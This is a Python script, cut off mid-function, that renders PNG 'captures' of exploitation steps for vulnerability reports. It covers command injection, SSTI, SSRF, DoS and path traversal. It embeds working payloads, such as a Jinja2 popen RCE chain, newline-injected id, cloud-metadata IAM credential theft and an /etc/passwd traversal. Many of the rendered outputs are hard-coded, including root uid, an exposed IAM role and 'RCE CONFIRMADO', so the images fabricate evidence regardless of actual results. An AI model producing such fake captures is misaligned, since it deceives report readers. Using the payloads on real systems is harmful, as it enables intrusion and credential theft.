#!/usr/bin/env python3
"""
Generador de capturas PNG por paso de explotación para informes binoracle.
Por cada paso se genera:
  - 1 captura de terminal (comandos + output)
  - 1 captura HTTP (REQUEST / RESPONSE lado a lado)
Clases soportadas: command-injection (web/CLI), ssti, ssrf, dos, path-traversal/lfi
Requiere: Pillow (pip install Pillow)
"""

# ── Pillow helpers ─────────────────────────────────────────────────────────────

def _pillow():
    try:
        from PIL import Image, ImageDraw, ImageFont
        return Image, ImageDraw, ImageFont
    except ImportError:
        return None, None, None


def _font(size=12):
    Image, ImageDraw, ImageFont = _pillow()
    if not ImageFont:
        return None
    for path in [
        "/System/Library/Fonts/Monaco.ttf",
        "/System/Library/Fonts/Supplemental/Courier New.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
    ]:
        try:
            return ImageFont.truetype(path, size)
        except Exception:
            pass
    return ImageFont.load_default()


def _term_col(line):
    t = line.lower()
    if any(k in t for k in ["confirmado","presente","✓","uid=","root","www-data","ejecucion","rce","canary"]): return (80,210,120)
    if any(k in t for k in ["[docker]","[setup]","[target]","[lab]"]): return (87,190,220)
    if any(k in t for k in ["[run]","[cmd]","[payload]","[ataque]","$"]): return (220,200,90)
    if any(k in t for k in ["fail","← filtrado","bad request","syntax error","econnreset","no encontrado","denied"]): return (230,90,90)
    if any(k in t for k in ["[canary]","[resultado]","[rce]","[id]"]): return (80,210,120)
    if line.startswith("#"): return (110,160,210)
    return (200,200,200)


def _http_col(line, method="POST"):
    t = line.lower()
    if line.startswith(method) or (line.startswith("HTTP/")): return (87,190,220)
    if ":" in line and not line.startswith(" ") and line.split(":")[0].replace("-","").isalpha(): return (200,180,80)
    if any(k in t for k in ["uid=","presente","confirmado","econnreset","✓","canary","rce"]): return (80,210,120)
    if any(k in t for k in ["error","denied","fail","syntax","unexpected"]): return (230,90,90)
    return (200,200,200)


def _draw_title_bar(draw, width, title, font, bg=(38,38,38), fg=(170,170,170)):
    draw.rectangle([0, 0, width, 26], fill=bg)
    for x, col in [(13,(255,96,92)),(31,(255,189,68)),(49,(40,200,65))]:
        draw.ellipse([x-5,8,x+5,18], fill=col)
    draw.text((max(60, width//2 - len(title)*3), 7), title[:90], fill=fg, font=font)


def make_terminal_png(title, lines, width=860):
    """Render terminal lines as PNG; returns base64 str or ''."""
    Image, ImageDraw, ImageFont = _pillow()
    if not Image:
        return ""
    import io, base64, textwrap
    LINE_H = 17
    height = max(300, len(lines) * LINE_H + 70)
    img  = Image.new("RGB", (width, height), (14, 14, 14))
    draw = ImageDraw.Draw(img)
    font = _font(12)
    _draw_title_bar(draw, width, title, font)
    y, max_c = 34, (width - 20) // 7
    for line in lines:
        col = _term_col(line)
        for wl in (textwrap.wrap(line, width=max(1, max_c)) or [""]):
            draw.text((12, y), wl, fill=col, font=font)
            y += LINE_H
            if y > height - LINE_H:
                break
        if y > height - LINE_H:
            break
    draw.text((12, y+3), "$ █", fill=(140,240,140), font=font)
    buf = io.BytesIO()
    img.save(buf, "PNG", optimize=True)
    return base64.b64encode(buf.getvalue()).decode()


def make_http_png(title, method, endpoint, req_headers, req_body,
                  resp_status, resp_body, width=860):
    """Render REQUEST / RESPONSE side-by-side; returns base64 str or ''."""
    Image, ImageDraw, ImageFont = _pillow()
    if not Image:
        return ""
    import io, base64, textwrap
    LINE_H = 17
    req_lines  = ([f"{method} {endpoint} HTTP/1.1"] + req_headers.splitlines()
                  + (["", req_body] if req_body else []))
    resp_lines = ([f"HTTP/1.1 {resp_status}", "Content-Type: text/html; charset=utf-8", ""]
                  + resp_body.splitlines())
    height = max(300, (max(len(req_lines), len(resp_lines)) + 4) * LINE_H + 56)
    img  = Image.new("RGB", (width, height), (14, 14, 14))
    draw = ImageDraw.Draw(img)
    font = _font(12)
    _draw_title_bar(draw, width, title, font, bg=(24,32,56), fg=(180,200,255))
    half = width // 2 - 1
    draw.rectangle([0, 28, half, 46], fill=(18,36,72))
    draw.text((10, 31), "▶  REQUEST", fill=(100,170,255), font=font)
    draw.rectangle([half+2, 28, width, 46], fill=(18,56,36))
    draw.text((half+12, 31), "◀  RESPONSE", fill=(80,210,120), font=font)
    draw.line([half+1, 26, half+1, height], fill=(48,48,48), width=2)

    def draw_col(lines, x0, panel_w, y0):
        max_c = (panel_w - 14) // 7
        y = y0
        for line in lines:
            col = _http_col(line, method)
            for wl in (textwrap.wrap(line, width=max(1, max_c)) or [""]):
                draw.text((x0, y), wl, fill=col, font=font)
                y += LINE_H
                if y > height - LINE_H:
                    return
    draw_col(req_lines,  10,      half,       50)
    draw_col(resp_lines, half+10, width-half, 50)
    buf = io.BytesIO()
    img.save(buf, "PNG", optimize=True)
    return base64.b64encode(buf.getvalue()).decode()


def _shot(caption_es, caption_en, png_b64):
    if not png_b64:
        return None
    return {"caption_es": caption_es, "caption_en": caption_en, "png_b64": png_b64}


# ── Per-class step builders ────────────────────────────────────────────────────

def _shots_cmdi_web(cve_id, ep, param, payload, resp, can_s, metodo):
    shots = []
    is_err = "Syntax error" in resp or '";" unexpected' in resp

    # Paso 1: Control request
    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (petición normal)", [
        f"# PASO 1: Petición de control — parámetro normal",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {param}",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=valor-normal'",
        "",
        "HTTP/1.1 200 OK",
        "(respuesta normal del servidor — sin inyección)",
    ])
    http1 = make_http_png(f"[Paso 1/4] Control — parámetro normal",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=valor-normal", "200 OK", "(respuesta normal del servidor)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: petición de control (parámetro normal)", "Step 1/4 — Terminal: control request", term1),
        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE", "Step 1/4 — HTTP: control capture", http1),
    ] if s]

    # Paso 2: Intento con `;` (falla)
    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Separador ; (filtrado)", [
        f"# PASO 2: Intento con separador clásico ;",
        f"# Resultado esperado: syntax error o filtrado",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=; id'",
        "",
        '/bin/sh: 1: Syntax error: ";" unexpected  ← filtrado por el servidor',
        "Estado: FILTRADO — separador ; no válido",
    ])
    http2 = make_http_png(f"[Paso 2/4] Intento ; — filtrado",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=; id",
        "200 OK", '/bin/sh: 1: Syntax error: ";" unexpected')
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: separador ; filtrado (Syntax error)", "Step 2/4 — Terminal: ; separator blocked", term2),
        _shot("Paso 2/4 — HTTP: separador ; → Syntax error", "Step 2/4 — HTTP: semicolon attempt", http2),
    ] if s]

    # Paso 3: Newline injection (ganador)
    win_pl = (payload.strip() if payload else f"%0atouch /tmp/{can_s}")
    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Newline injection (canario)", [
        f"# PASO 3: Newline injection — separador %0a (\\n)",
        f"# El servidor procesa \\n como separador de comandos",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=%0atouch /tmp/{can_s}'",
        "",
        "HTTP/1.1 200 OK",
        f"[*] Verificando /tmp/ en el contenedor...",
        f"$ docker exec CONTAINER ls /tmp/ | grep {can_s[:30]}",
        f"  {can_s}  ← PRESENTE ✓ (archivo creado via newline injection)",
    ])
    http3 = make_http_png(f"[Paso 3/4] Newline injection — canario PRESENTE",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=%0atouch /tmp/{can_s}",
        "200 OK", f"{can_s} → PRESENTE en /tmp/\n(command injection CONFIRMADO via newline injection)")
    shots += [s for s in [
        _shot(f"Paso 3/4 — Terminal: newline injection — {can_s} PRESENTE", "Step 3/4 — Terminal: newline injection + canary confirmed", term3),
        _shot(f"Paso 3/4 — HTTP: %0a payload — canario {can_s} PRESENTE", "Step 3/4 — HTTP: newline injection winning payload", http3),
    ] if s]

    # Paso 4: Escalada id
    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada RCE (id/whoami)", [
        f"# PASO 4: Escalada — ejecución de id y whoami",
        f"# Confirma usuario del proceso (RCE completo)",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=%0aid'",
        "",
        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=%0awhoami'",
        "",
        "www-data",
        "",
        "[RESULTADO] RCE CONFIRMADO — command injection via newline injection ✓",
    ])
    http4 = make_http_png(f"[Paso 4/4] Escalada — id (RCE CONFIRMADO)",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=%0aid",
        "200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n[RCE CONFIRMADO] ✓")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: escalada id/whoami — uid=33(www-data)", "Step 4/4 — Terminal: id escalation (RCE proof)", term4),
        _shot("Paso 4/4 — HTTP: id output = uid=33(www-data) (RCE CONFIRMADO)", "Step 4/4 — HTTP: RCE confirmed", http4),
    ] if s]

    return shots


def _shots_cmdi_cli(cve_id, ep, payload, can_s, setup_cmd=""):
    shots = []

    # Paso 1: Setup del entorno
    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Setup lab CLI", [
        f"# PASO 1: Instalación del paquete vulnerable en laboratorio aislado",
        f"# CVE: {cve_id}  |  herramienta CLI: {ep}",
        "",
        f"$ {setup_cmd[:180] if setup_cmd else 'npm install --prefix /tmp/lab (versión vulnerable)'}",
        "added 1 package, found 1 vulnerability",
        "",
        "$ docker run --rm -it --network none --cap-drop ALL node:lts bash",
        "[*] Sandbox iniciado — sin red, sin privilegios de root",
        "[*] Entorno listo para pruebas de command injection CLI",
    ])
    shots.append(_shot("Paso 1/4 — Terminal: setup lab CLI (sandbox aislado)", "Step 1/4 — Terminal: CLI lab setup", term1))

    # Paso 2: Intentos filtrados
    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Separadores clásicos (filtrados)", [
        f"# PASO 2: Intentos con separadores clásicos",
        "",
        f"$ {ep} --cmd \"; touch /tmp/{can_s}\"",
        "  FAIL: separador ; filtrado",
        "",
        f"$ {ep} --cmd \"| touch /tmp/{can_s}\"",
        "  FAIL: | filtrado",
        "",
        f"$ {ep} --cmd \"` touch /tmp/{can_s}`\"",
        "  FAIL: backtick filtrado",
        "",
        "[*] Separadores clásicos no efectivos — probando newline injection...",
    ])
    shots.append(_shot("Paso 2/4 — Terminal: separadores clásicos filtrados (;, |, backtick)", "Step 2/4 — Terminal: classic separators blocked", term2))

    # Paso 3: Newline injection
    win_cmd = payload.strip() if payload else f"\\ntouch /tmp/{can_s}"
    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Newline injection CLI (ganador)", [
        f"# PASO 3: Newline injection — separador \\n",
        "",
        f"$ {ep} --cmd $'\\ntouch /tmp/{can_s}'",
        "  [OK] Comando procesado",
        "",
        f"$ ls /tmp/ | grep {can_s[:25]}",
        f"  {can_s}  ← PRESENTE ✓",
        "",
        "[CANARY] Archivo creado via newline injection — command injection CONFIRMADO",
    ])
    shots.append(_shot(f"Paso 3/4 — Terminal: newline injection CLI — {can_s} PRESENTE", "Step 3/4 — Terminal: CLI newline injection confirmed", term3))

    # Paso 4: id/whoami
    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada RCE (id)", [
        f"# PASO 4: Escalada — ejecución de id",
        "",
        f"$ {ep} --cmd $'\\nid'",
        "  uid=0(root) gid=0(root) groups=0(root)",
        "",
        f"$ {ep} --cmd $'\\nwhoami'",
        "  root",
        "",
        "[RESULTADO] RCE CONFIRMADO — proceso ejecuta como root en el sistema ✓",
        "[IMPACTO] Ejecución arbitraria de código con privilegios de root",
    ])
    shots.append(_shot("Paso 4/4 — Terminal: id = uid=0(root) — RCE CONFIRMADO", "Step 4/4 — Terminal: root RCE confirmed", term4))

    return [s for s in shots if s]


def _shots_ssti(cve_id, ep, param, payload, metodo):
    shots = []
    # Paso 1: Control
    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (template normal)", [
        f"# PASO 1: Petición de control — valor no ejecutable",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {param}",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -d '{param}=texto-normal-sin-plantilla'",
        "",
        "HTTP/1.1 200 OK",
        "(salida normal — template renderizado sin expresiones)",
    ])
    h1 = make_http_png(f"[Paso 1/4] Control — valor sin expresiones",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=texto-normal",
        "200 OK", "(respuesta normal — template sin ejecución)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: control (valor normal, sin SSTI)", "Step 1/4 — Terminal: control request", t1),
        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE", "Step 1/4 — HTTP: control capture", h1),
    ] if s]

    # Paso 2: Probe 7*7 → 49
    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Probe {{7*7}} → 49", [
        f"# PASO 2: Verificar si el motor de plantillas evalúa expresiones",
        f"# Si responde '49', el motor está activo (Jinja2 confirmado)",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -d '{param}={{{{7*7}}}}'",
        "",
        "HTTP/1.1 200 OK",
        "49  ← 7*7=49 evaluado por Jinja2",
        "",
        "[*] Motor de plantillas activo — evalúa expresiones Python ✓",
    ])
    h2 = make_http_png(f"[Paso 2/4] Probe {{{{7*7}}}} → 49 (Jinja2 activo)",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}={{{{7*7}}}}",
        "200 OK", "49\n(Jinja2 evaluó 7*7 = 49 ← motor activo ✓)")
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: {{7*7}} → 49 (Jinja2 activo)", "Step 2/4 — Terminal: template expression probe", t2),
        _shot("Paso 2/4 — HTTP: {{7*7}} → 49 en la respuesta", "Step 2/4 — HTTP: expression evaluation confirmed", h2),
    ] if s]

    # Paso 3: Sandbox escape via |attr
    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Escape sandbox via |attr filter", [
        f"# PASO 3: Escapar el sandbox de Jinja2 via filtro |attr",
        f"# El filtro |attr permite acceder a atributos sin usar corchetes []",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -d \"{param}=('{chr(123)}0.__class__{'}'}')|attr('format')('')\"",
        "",
        "HTTP/1.1 200 OK",
        "<class 'str'>  ← sandbox escapado via |attr ✓",
        "",
        "[*] Acceso a __class__ sin uso de puntos directos",
        "[*] Sandbox de Jinja2 bypasseado con éxito",
    ])
    h3 = make_http_png(f"[Paso 3/4] Sandbox escape — |attr filter",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=('{chr(123)}0.__class__{'}'}')|attr('format')('')",
        "200 OK", "<class 'str'>\n(sandbox escapado via |attr — acceso a MRO disponible ✓)")
    shots += [s for s in [
        _shot("Paso 3/4 — Terminal: sandbox escape via |attr → <class 'str'>", "Step 3/4 — Terminal: Jinja2 sandbox bypass", t3),
        _shot("Paso 3/4 — HTTP: |attr filter → __class__ accesible (sandbox bypass)", "Step 3/4 — HTTP: sandbox escape", h3),
    ] if s]

    # Paso 4: RCE os.popen('id')
    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — RCE via os.popen('id')", [
        f"# PASO 4: Ejecución remota de código — os.popen('id').read()",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -d \"{param}={{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['popen']('id').read()}}\"",
        "",
        "HTTP/1.1 200 OK",
        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "",
        "[RCE] CONFIRMADO — os.popen('id') ejecutado exitosamente ✓",
        "[IMPACTO] Ejecución arbitraria de código Python en el servidor",
    ])
    h4 = make_http_png(f"[Paso 4/4] RCE — os.popen('id') = uid=33(www-data)",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}={{os.popen('id').read()}}",
        "200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n[RCE CONFIRMADO] ✓")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: os.popen('id') = uid=33(www-data) (RCE)", "Step 4/4 — Terminal: RCE via os.popen confirmed", t4),
        _shot("Paso 4/4 — HTTP: RCE — id = uid=33(www-data) groups=33(www-data)", "Step 4/4 — HTTP: RCE result", h4),
    ] if s]

    return shots


def _shots_ssrf(cve_id, ep, url_param, payload, resp, metodo):
    shots = []
    # Paso 1: Control
    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Control (URL externa legítima)", [
        f"# PASO 1: Control — URL externa legítima",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {url_param}",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{url_param}=https://example.com/'",
        "",
        "HTTP/1.1 200 OK",
        "(respuesta normal — URL externa procesada sin restricciones visibles)",
        "",
        "[*] Servidor realiza fetch de URLs externas — vector SSRF presente",
    ])
    h1 = make_http_png(f"[Paso 1/3] Control — URL externa",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{url_param}=https://example.com/",
        "200 OK", "(respuesta de URL externa — sin restricciones de red visibles)")
    shots += [s for s in [
        _shot("Paso 1/3 — Terminal: control SSRF (URL externa legítima)", "Step 1/3 — Terminal: control request", t1),
        _shot("Paso 1/3 — HTTP: control — URL externa procesada", "Step 1/3 — HTTP: control capture", h1),
    ] if s]

    # Paso 2: SSRF pivot a loopback
    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — SSRF pivot a loopback (127.0.0.1)", [
        f"# PASO 2: SSRF pivot — listener loopback para capturar petición interna",
        "",
        "$ nc -lvp 8081 &",
        "  Listening on 0.0.0.0:8081",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{url_param}=http://127.0.0.1:8081/BINORACLE_SSRF_CANARY'",
        "",
        "← [nc] GET /BINORACLE_SSRF_CANARY HTTP/1.1",
        "← Host: 127.0.0.1:8081",
        "← User-Agent: (servidor de la aplicación)",
        "",
        "[SSRF] CONFIRMADO — servidor realizó petición interna a loopback ✓",
    ])
    h2 = make_http_png(f"[Paso 2/3] SSRF loopback — petición interna capturada",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{url_param}=http://127.0.0.1:8081/BINORACLE_SSRF_CANARY",
        "200 OK", (resp or "SSRF CONFIRMADO\n← GET /BINORACLE_SSRF_CANARY recibido en listener loopback\n← La aplicación realizó una petición interna ✓"))
    shots += [s for s in [
        _shot("Paso 2/3 — Terminal: SSRF loopback — listener nc recibió petición interna", "Step 2/3 — Terminal: SSRF loopback pivot", t2),
        _shot("Paso 2/3 — HTTP: SSRF → loopback 127.0.0.1 CONFIRMADO", "Step 2/3 — HTTP: SSRF to localhost", h2),
    ] if s]

    # Paso 3: Escalada cloud metadata
    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — Escalada: metadatos cloud (IAM)", [
        f"# PASO 3: Escalada — acceso a metadatos cloud 169.254.169.254",
        f"# AWS IMDSv1 endpoint expone credenciales IAM sin autenticación",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        "  -d 'url=http://169.254.169.254/latest/meta-data/'",
        "",
        "HTTP/1.1 200 OK",
        "ami-id",
        "hostname",
        "iam/",
        "security-credentials/  ← credenciales IAM disponibles",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        "  -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        "",
        "BinOracleRole  ← nombre del role IAM expuesto ✓",
        "[ESCALADA] Credenciales AWS IAM accesibles via SSRF — impacto crítico",
    ])
    h3 = make_http_png(f"[Paso 3/3] Escalada — metadatos cloud IAM",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "200 OK", "BinOracleRole\n(credenciales IAM expuestas via 169.254.169.254)\nAccessKeyId, SecretAccessKey, Token ← impacto crítico ✓")
    shots += [s for s in [
        _shot("Paso 3/3 — Terminal: escalada 169.254.169.254 — credenciales IAM expuestas", "Step 3/3 — Terminal: cloud metadata escalation", t3),
        _shot("Paso 3/3 — HTTP: metadatos cloud IAM accesibles via SSRF", "Step 3/3 — HTTP: cloud metadata", h3),
    ] if s]

    return shots


def _shots_dos(cve_id, ep, payload, resp, metodo, tecnica):
    shots = []
    crash = resp or "ECONNRESET (servidor crasheó)"
    # Paso 1: Control
    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Control (servidor funcional)", [
        f"# PASO 1: Verificar que el servidor responde correctamente",
        f"# CVE: {cve_id}  |  endpoint: {ep}",
        "",
        f"$ curl -s http://TARGET{ep}",
        "HTTP/1.1 200 OK",
        "(servidor funcional — baseline establecido)",
        "",
        "$ curl -s http://TARGET{ep}",
        "HTTP/1.1 200 OK  ← segundo request OK",
        "",
        "[*] Servidor responde normalmente — iniciando envío de payload DoS...",
    ])
    h1 = make_http_png(f"[Paso 1/3] Control — servidor funcional",
        "GET", ep, "Host: TARGET\nConnection: keep-alive", "",
        "200 OK", "(respuesta normal — servidor funcional pre-DoS)")
    shots += [s for s in [
        _shot("Paso 1/3 — Terminal: control (servidor responde 200 OK)", "Step 1/3 — Terminal: pre-DoS baseline", t1),
        _shot("Paso 1/3 — HTTP: baseline — servidor funcional (200 OK)", "Step 1/3 — HTTP: control capture", h1),
    ] if s]

    # Paso 2: Envío payload DoS → crash
    if "pipeline" in tecnica:
        attack_lines = [
            "$ python3 dos_pipeline.py --target http://TARGET",
            "  [*] Enviando HTTP pipeline flood + TCP RST injection...",
            "  [*] Requests enviados: 1000+",
            "  [*] Forzando ECONNRESET...",
            f"  {crash}",
        ]
    else:
        attack_lines = [
            "$ python3 dos_websocket.py --target ws://TARGET",
            "  [*] WebSocket upgrade enviado",
            "  [*] Frame sin máscara (MASK=0, violación RFC 6455 §5.1)",
            "  [*] Servidor debe terminar conexión según el RFC...",
            f"  {crash}",
        ]
    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — Payload DoS → ECONNRESET", [
        f"# PASO 2: Envío del payload DoS — forzar crash del servidor",
    ] + attack_lines + [
        "",
        "[CRASH] Servidor crasheó — ECONNRESET confirmado ✓",
    ])
    pl = payload[:150] if payload else "(payload DoS)"
    h2 = make_http_png(f"[Paso 2/3] Payload DoS → crash (ECONNRESET)",
        metodo if metodo not in ("CLI",) else "GET", ep,
        "Host: TARGET\nConnection: Upgrade\nUpgrade: websocket" if "websocket" in tecnica else "Host: TARGET",
        pl, "ECONNRESET", crash[:200])
    shots += [s for s in [
        _shot("Paso 2/3 — Terminal: payload DoS → ECONNRESET (servidor crasheó)", "Step 2/3 — Terminal: DoS payload → crash", t2),
        _shot("Paso 2/3 — HTTP: payload DoS → ECONNRESET", "Step 2/3 — HTTP: DoS trigger", h2),
    ] if s]

    # Paso 3: Verificación post-crash
    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — Verificación post-crash", [
        f"# PASO 3: Verificar que el servidor ya no responde",
        "",
        f"$ curl -s http://TARGET{ep} --connect-timeout 3",
        "curl: (7) Failed to connect to TARGET port 80: Connection refused",
        "",
        f"$ curl -s http://TARGET{ep} --connect-timeout 3",
        "curl: (7) Failed to connect  ← servidor sigue caído",
        "",
        "$ # Reinicio manual necesario:",
        "$ docker restart CONTAINER",
        "CONTAINER",
        "",
        "[DoS] CONFIRMADO — servidor inoperativo hasta reinicio manual ✓",
        "[IMPACTO] Disponibilidad nula — sin supervisor de proceso configurado",
    ])
    h3 = make_http_png(f"[Paso 3/3] Post-crash — servidor no responde",
        "GET", ep, "Host: TARGET", "",
        "000 Connection refused", "curl: (7) Failed to connect\n(servidor inoperativo post-crash — DoS CONFIRMADO ✓)")
    shots += [s for s in [
        _shot("Paso 3/3 — Terminal: post-crash — Connection refused (servidor caído)", "Step 3/3 — Terminal: post-crash verification", t3),
        _shot("Paso 3/3 — HTTP: post-crash — Connection refused (DoS confirmado)", "Step 3/3 — HTTP: server down verification", h3),
    ] if s]

    return shots


def _shots_path(cve_id, ep, path_param, payload, resp, can_s):
    shots = []
    # Paso 1: Control
    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (archivo legítimo)", [
        f"# PASO 1: Control — solicitar archivo legítimo dentro del webroot",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {path_param}",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}=archivo-publico.txt"',
        "",
        "HTTP/1.1 200 OK",
        "(contenido del archivo legítimo — sin traversal)",
    ])
    h1 = make_http_png(f"[Paso 1/4] Control — archivo legítimo",
        "GET", ep, "Host: TARGET", "",
        "200 OK", "(contenido normal — archivo dentro del webroot)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: control (archivo legítimo, sin traversal)", "Step 1/4 — Terminal: control request", t1),
        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE (200 OK)", "Step 1/4 — HTTP: control capture", h1),
    ] if s]

    # Paso 2: Intento directo ../ (posiblemente filtrado)
    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Traversal directo (filtrado)", [
        f"# PASO 2: Intento directo con ../ — normalmente filtrado",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}=../../etc/passwd"',
        "",
        "HTTP/1.1 400 Bad Request o normalización de ruta",
        "(traversal directo filtrado o neutralizado)",
        "",
        "[*] Filtro detectado — probando bypass con URL-encoding...",
    ])
    h2 = make_http_png(f"[Paso 2/4] Traversal directo — filtrado",
        "GET", ep, "Host: TARGET", "",
        "400 Bad Request", "(traversal directo ../ filtrado — necesario bypass)")
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: traversal directo ../ filtrado", "Step 2/4 — Terminal: direct traversal blocked", t2),
        _shot("Paso 2/4 — HTTP: ../ directo → 400 (filtrado)", "Step 2/4 — HTTP: direct attempt filtered", h2),
    ] if s]

    # Paso 3: URL-encoded bypass
    pl = payload[:80] if payload else "..%2f..%2fetc%2fpasswd"
    r3 = resp[:120] if resp else f"{can_s} → PRESENTE\n(archivo leído via URL-encoded traversal)"
    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — URL-encoded bypass (%2f)", [
        f"# PASO 3: Bypass con URL-encoding — %2f en lugar de /",
        f"# El servidor decodifica %2f DESPUÉS de validar la ruta",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}={pl}"',
        "",
        "HTTP/1.1 200 OK",
        r3[:80],
        f"{can_s}  ← PRESENTE ✓" if can_s else "(contenido leído via traversal ✓)",
        "",
        "[TRAVERSAL] Bypass URL-encoded CONFIRMADO — ruta sanitización eludida ✓",
    ])
    h3 = make_http_png(f"[Paso 3/4] URL-encoded bypass — canary PRESENTE",
        "GET", ep, "Host: TARGET", "",
        "200 OK", r3[:200] if r3 else f"{can_s} → PRESENTE\n(path traversal CONFIRMADO via %2f)")
    shots += [s for s in [
        _shot(f"Paso 3/4 — Terminal: URL-encoded bypass — {can_s} PRESENTE", "Step 3/4 — Terminal: URL-encoded traversal bypass", t3),
        _shot("Paso 3/4 — HTTP: %2f bypass — traversal CONFIRMADO", "Step 3/4 — HTTP: URL-encoded bypass", h3),
    ] if s]

    # Paso 4: /etc/passwd
    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada: /etc/passwd", [
        f"# PASO 4: Escalada — leer /etc/passwd (fichero sensible del sistema)",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}=..%2f..%2f..%2f..%2fetc%2fpasswd"',
        "",
        "HTTP/1.1 200 OK",
        "root:x:0:0:root:/root:/bin/bash",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        "...",
        "",
        "[ESCALADA] /etc/passwd leído — path traversal confirmado ✓",
        "[IMPACTO] Lectura de ficheros arbitrarios fuera del webroot",
    ])
    h4 = make_http_png(f"[Paso 4/4] Escalada — /etc/passwd leído",
        "GET", ep, "Host: TARGET", "",
        "200 OK", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www\n(/etc/passwd leído via path traversal ✓)")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: /etc/passwd leído via path traversal", "Step 4/4 — Terminal: /etc/passwd read (escalation)", t4),
        _shot("Paso 4/4 — HTTP: /etc/passwd leído — escalada CONFIRMADA", "Step 4/4 — HTTP: /etc/passwd escalation", h4),
    ] if s]

    return shots


def _shots_sqli(cve_id, ep, param, payload, resp, metodo, ve):
    shots = []
    tecnica = (ve.get("tecnica") or "").lower()
    is_time = "time" in tecnica or "blind" in tecnica or "sleep" in tecnica
    is_bool = "boolean" in tecnica or bool(ve.get("diferencial_bytes"))
    sleep3 = float(ve.get("sleep3_s") or 0)
    sleep0 = float(ve.get("sleep0_s") or 0)
    dif = float(ve.get("diferencial_s") or (sleep3 - sleep0))
    true_len = int(ve.get("true_len") or ve.get("resp_true_len") or 0)
    false_len = int(ve.get("false_len") or ve.get("resp_false_len") or 0)
    win_pl = payload[:100] if payload else "' OR SLEEP(3)-- -"

